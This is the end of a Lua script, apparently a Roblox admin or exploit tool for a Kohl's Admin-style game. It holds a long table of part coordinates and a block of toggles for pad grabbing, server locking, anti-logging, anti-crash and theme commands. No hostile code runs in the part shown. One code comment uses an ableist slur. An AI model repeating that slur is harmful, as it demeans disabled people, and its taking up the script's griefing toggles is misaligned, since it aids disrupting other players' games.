                ["SmoothBlockModel60"] = {-57.0650024, 15.4300003, 61.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel59"] = {-47.0650024, 27.4300022, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel86"] = {-11.0650005, 26.2300014, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel52"] = {-19.0650005, 19.6300011, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel23"] = {-45.0650024, 28.6300011, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel79"] = {-37.0650024, 33.4300003, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel4"] = {-37.5650024, 8.2300005, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel2"] = {-55.0650024, 22.6300011, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel20"] = {-20.5650005, 5.23000002, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel24"] = {-57.0650024, 10.0300007, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel47"] = {-53.0650024, 23.8300018, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel5"] = {-41.0650024, 1.63000011, 39.243, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel25"] = {-43.0650024, 29.8300018, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel70"] = {-8.56500053, 11.2300005, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel73"] = {-16.5650005, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel22"] = {-30.0650005, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel126"] = {-57.0650024, 5.23000002, 71.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel1"] = {-41.0650024, 1.03000009, 37.243, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel232"] = {-30.1660023, 5.82995605, 70.4320068, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel231"] = {-43.0650024, 29.8300018, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel230"] = {-49.0650024, 26.2300014, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel229"] = {-53.0650024, 23.8300018, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel227"] = {-43.0650024, 29.8300018, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel226"] = {-30.0650005, 32.2300034, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel225"] = {-51.0650024, 25.0300007, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel224"] = {-50.5650024, 11.2300005, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel223"] = {-30.0650005, 34.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel222"] = {-55.0650024, 22.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel221"] = {-37.0650024, 33.4300003, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel218"] = {-44.0650024, 15.4300003, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel217"] = {-43.5650024, 13.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel216"] = {-39.0650024, 32.2300034, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel214"] = {-35.0650024, 34.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel213"] = {-30.0650005, 31.0300007, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel211"] = {-30.0650005, 29.8300018, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel208"] = {-30.0650005, 26.2300014, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel204"] = {-22.5650005, 10.0300007, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel203"] = {-30.0650005, 23.8300018, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel201"] = {-30.1650009, 21.4300003, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel196"] = {-30.0650005, 9.43000031, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel193"] = {-43.0650024, 29.8300018, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel191"] = {-30.0650005, 18.4300003, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel187"] = {-33.0650024, 35.8300018, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel185"] = {-44.5650024, 13.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel205"] = {-30.0650005, 15.4300003, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel197"] = {-30.0650005, 22.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel184"] = {-55.0650024, 22.6300011, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel180"] = {-33.0650024, 35.8300018, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel174"] = {-57.0650024, 10.0300007, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel171"] = {-57.0650024, 15.4300003, 83.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel167"] = {-47.0650024, 27.4300022, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel164"] = {-9.56500053, 11.2300005, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel161"] = {-3.06500006, 10.0300007, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel159"] = {-3.06500006, 13.6300011, 85.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel157"] = {-39.0650024, 32.2300034, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel155"] = {-30.0650005, 5.23000002, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel154"] = {-30.0650005, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel173"] = {-57.0650024, 13.6300011, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel152"] = {-41.0650024, 31.0300007, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel151"] = {-57.0650024, 21.4300003, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel150"] = {-57.5650024, 7.03000021, 83.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel206"] = {-37.5650024, 10.0300007, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel148"] = {-3.06500006, 10.0300007, 79.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel177"] = {-35.0650024, 34.6300011, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel144"] = {-3.06500006, 13.6300011, 80.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel198"] = {-16.0650005, 15.4300003, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel142"] = {-3.06500006, 13.6300011, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel141"] = {-37.0650024, 33.4300003, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel138"] = {-55.0650024, 22.6300011, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel136"] = {-51.0650024, 25.0300007, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel134"] = {-3.06500006, 11.2300005, 93.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel133"] = {-47.0650024, 27.4300022, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel132"] = {-3.06500006, 15.4300003, 86.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel145"] = {-57.0650024, 10.0300007, 79.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel146"] = {-57.0650024, 13.6300011, 80.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel175"] = {-57.0650024, 13.6300011, 85.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel202"] = {-30.0650005, 38.2300034, 96.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel209"] = {-30.0650005, 25.0300007, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel168"] = {-39.0650024, 32.2300034, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel186"] = {-57.0650024, 11.2300005, 93.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel139"] = {-41.0650024, 31.0300007, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel188"] = {-30.0650005, 37.0300026, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel195"] = {-19.0650005, 7.03000021, 99.7430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel219"] = {-57.0650024, 21.4300003, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel200"] = {-51.0650024, 25.0300007, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel183"] = {-21.5650005, 13.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel101"] = {-3.06500006, 15.4300003, 83.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel207"] = {-30.0650005, 28.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel153"] = {-30.0650005, 37.0300026, 90.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel194"] = {-16.5650005, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel210"] = {-30.0650005, 27.4300022, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel181"] = {-41.0650024, 7.03000021, 99.7430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel93"] = {-57.0650024, 9.43000031, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel90"] = {-45.0650024, 28.6300011, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel156"] = {-35.0650024, 34.6300011, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel166"] = {-15.5650005, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel179"] = {-57.0650024, 15.4300003, 86.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel220"] = {-41.0650024, 31.0300007, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel163"] = {-49.0650024, 26.2300014, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel91"] = {-49.0650024, 26.2300014, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel228"] = {-41.0650024, 15.4300003, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel94"] = {-30.0650005, 38.2300034, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel189"] = {-45.0650024, 28.6300011, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel190"] = {-30.0650005, 33.4300003, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel107"] = {-57.0650024, 21.4300003, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel96"] = {-33.0650024, 35.8300018, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel149"] = {-30.0650005, 37.0300026, 78.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel158"] = {-30.0650005, 38.2300034, 84.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel215"] = {-47.0650024, 27.4300022, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel212"] = {-44.5650024, 10.0300007, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel169"] = {-53.0650024, 23.8300018, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel172"] = {-45.0650024, 28.6300011, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel199"] = {-15.5650005, 10.0300007, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel182"] = {-38.5650024, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel121"] = {-2.56500006, 7.03000021, 83.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel92"] = {-53.0650024, 23.8300018, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel170"] = {-37.0650024, 33.4300003, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel192"] = {-19.0650005, 15.4300003, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Spawn1"] = {-29, 0.0999880284, -25.5900097, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Spawn2"] = {-53, 0.0999999493, -25.5900097, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Spawn3"] = {-41, 0.0999999493, -25.5899963, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Regen"] = {-7.16499996, 5.42998981, 94.7429962, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Baseplate"] = {0, 0.100000001, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Jump"] = {-41.0650024, 1.30000007, -5.95700026, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump1"] = {-41.0650024, 1.30000007, 0.243000016, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump2"] = {-41.0650024, 1.30000007, -11.9570007, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump3"] = {-41.0650024, 1.30000007, 11.0430002, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump4"] = {-41.0650024, 1.30000007, 16.0430012, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump5"] = {-41.0650024, 1.30000007, 6.24300051, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump6"] = {-41.0650024, 1.30000007, 21.2430019, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump7"] = {-41.0650024, 1.30000007, 26.4430008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump8"] = {-41.0650024, 1.30000007, 31.2430019, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump9"] = {-41.0650024, 1.30000007, -17.757, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Left Wall"] = {-23.0650024, 16.5000019, 0.243000031, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Right Wall"] = {-59.0650101, 16.5000038, 0.243000031, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Ceiling Wall"] = {-41.0649872, 31.6999989, 1.24301004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Back Wall"] = {-41.0649948, 16.5000076, -30.757, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Pad8"] = {-40.7649879, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad7"] = {-36.7649803, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad6"] = {-32.7649765, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad3"] = {-20.7649632, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad9"] = {-44.7649994, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad1"] = {-12.7649641, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad5"] = {-28.7649689, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad2"] = {-16.7649612, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad4"] = {-24.764967, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel40"] = {-30.0650005, 1.03000009, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel38"] = {-30.0650005, 2.83000016, 72.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel112"] = {-30.0650005, 4.63000011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider1"] = {-10.7649708, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider2"] = {-14.7649689, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider3"] = {-18.7649689, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider4"] = {-22.7649727, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider5"] = {-26.7649746, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider6"] = {-30.7649822, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider7"] = {-34.7649841, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider8"] = {-38.7649918, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider9"] = {-42.7650032, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider10"] = {-46.7649994, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Back"] = {-28.7649994, 6.42999983, 96.3430023, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel85"] = {-3.06500006, 9.43000031, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part57"] = {-101.076004, 1.20200002, 13.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part55"] = {-101.076004, 1.70000005, 17.4740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part54"] = {-97.576004, 0.900000036, 17.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part53"] = {-95.0770035, 0.90200007, 7.47400045, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part52"] = {-95.076004, 1.20200002, 10.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part50"] = {-89.576004, 1.20000005, 17.9740009, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Part47"] = {-93.576004, 1.20000005, 17.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part49"] = {-85.576004, 1.20000005, 17.9740009, 0, 0, 1, 0, -1, 0, 1, 0, -0},
                ["Part46"] = {-93.576004, 1.20000005, 13.9740009, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Part44"] = {-74.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part43"] = {-78.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part40"] = {-85.576004, 1.20000005, 13.9740009, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Part60"] = {-101.076004, 0.90200007, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part36"] = {-89.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part56"] = {-101.076004, 0.90200007, 10.4760008, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part35"] = {-86.0780029, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part33"] = {-77.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part32"] = {-83.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part41"] = {-89.576004, 0.900000036, 13.9740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part31"] = {-77.076004, 2.70000005, 7.47400045, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part27"] = {-72.6300049, 2.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part42"] = {-89.0780029, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part26"] = {-72.6300049, 6.10000038, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part30"] = {-83.0780029, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part39"] = {-86.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part25"] = {-72.6300049, 3.70000029, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part24"] = {-72.6300049, 7.30000019, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part34"] = {-80.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part21"] = {-68.0300064, 8.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part22"] = {-72.6300049, 1.30000007, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part58"] = {-98.076004, 0.90200007, 10.4760008, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part17"] = {-68.0300064, 6.10000038, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part19"] = {-68.0300064, 2.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part20"] = {-68.0300064, 4.9000001, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part23"] = {-72.6300049, 8.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part15"] = {-68.0300064, 7.30000019, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part13"] = {-67.5, 8.5, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part12"] = {-67.5, 7.30000019, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part48"] = {-92.0770035, 1.20200002, 10.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part8"] = {-67.5, 4.9000001, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part59"] = {-98.076004, 1.20200002, 13.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part10"] = {-67.5, 1.30000007, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part7"] = {-69, 8.5, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part28"] = {-72.6300049, 4.9000001, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part6"] = {-69, 7.30000019, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part9"] = {-67.5, 6.10000038, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part5"] = {-69, 6.0999999, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part16"] = {-68.0300064, 1.30000007, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part18"] = {-68.0300064, 3.70000029, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part11"] = {-67.5, 3.70000029, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part4"] = {-69, 4.9000001, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part3"] = {-69, 3.70000005, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part2"] = {-69, 2.5, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part1"] = {-69, 1.30000007, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part37"] = {-76.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part14"] = {-67.5, 2.5, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part45"] = {-82.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part38"] = {-80.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part29"] = {-80.076004, 0.900000036, 7.47400045, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Part61"] = {-98.0770035, 0.90200007, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part51"] = {-92.0770035, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1}
}

-- Auto blacklisting for stuff
local autoblvgc = true -- retards kept gearing everyone so here's a quick fix

-- Anti logs
local antimlog = false -- for music
local antiglog = false -- for gears
local anticlog = false -- for chars

-- Admin stuff relating to users
local padbanned = {} 
local padreinforcements = false 

-- Variables for moving [old]
local Game_Folder = game:GetService("Workspace").Terrain["_Game"]
local Workspace_Folder = Game_Folder.Workspace
local Admin_Folder = Game_Folder.Admin

-- Themes
local themecode = {
    {name = "dark blue", code = "time 4,outdoorambient 000 000 11"},
    {name = "old trip", code = "fogend 100,fogcolor 250 0 500"},
    {name = "shanty night", code = "time 19,outdoorambient 250 100 250"},
    {name = "purple glaze", code = "time -,fogend 600,fogcolor 300 0 800"},
    {name = "yellow mist", code = "time -,fogend 25,fogcolor 255 255 51"},
    {name = "dark depths", code = "time 0,fogcolor 0 0 0,fogend 25"},
    {name = "nice sky", code = "fogend 75,fogcolor 0 155 255"},
    {name = "bright pink", code = "time -,fogend 46,fogcolor 250 83 255"},
    {name = "acid proximity", code = "time -,fogend 1000,fogcolor 37 355 55"},
    {name = "sapphire evening", code = "fogcolor 100 0 255,fogend 1000,time 6,outdoorambient 0 0 0,brightness 0.5,ambient 125 0 255"},
    {name = "sunset", code = "fix,time 7,fogend 2000,outdoorambient 0.3 0.3 0.3"}
}

-- Keybinds
local housekeybind = "h" -- Keybinds?!
local rekeybind = "r"

-- Auto things when people join
local autogpcheck = true -- automatically check for player's gamepasses
local autogb = false

-- Clicking
local clickexplode = false -- yeah

-- Admin things relating to users
local FAdmins = {} -- all admin but for individual users
local alladmin = false -- all admin

-- Super commands and spamming
local amon = 100 -- super command times
local spamwait = 0 -- spam command wait

-- Music telling
local musicsay = true

-- Admin related
local perm = false
local perm2 = false
local loopgrab = false
local loopgrab2 = false

-- Antis
local anticrash = true
local anticrash2 = false
local antigear = false
local antigear2 = false
local antigb = true
local antipaint = false
local antiattach2 = false

local antiflash = false
local antidisco = false
local antifogend = false
local antichat = false
local antiattach = false
local noblt = false
local YOUantigs = false

-- Gojo server lock
local gjdelock = false

-- Pings relating to others users
local PingLogs = false -- it's caps lol
local PingCsystem = true
local AntiLogs = false

local noobdetect = true
local welcomemsg = true

-- local permpassid = 66254 or 64354 -> NBC, BC
